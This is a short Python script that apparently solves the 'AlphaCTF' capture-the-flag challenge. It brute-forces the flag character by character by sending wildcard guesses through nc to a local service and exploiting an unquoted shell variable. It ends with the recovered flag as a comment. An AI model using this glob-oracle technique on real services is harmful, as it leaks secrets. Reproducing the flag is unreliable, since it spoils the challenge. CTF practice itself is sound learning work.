import string
import subprocess

chars = list(string.ascii_letters + string.digits + '}')
flag = "AlphaCTF{"
found = False

while not found:
    for c in chars:
        cmd = f"echo '{flag}{c}*' | nc localhost 1337"
        output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        if "Nice" in output:
            flag += c
            print(flag)
            break
    else:
        found = True

# FLAG: AlphaCTF{N3v3r_f0rget_t0_qu0t3_ur_v4r1abl35}
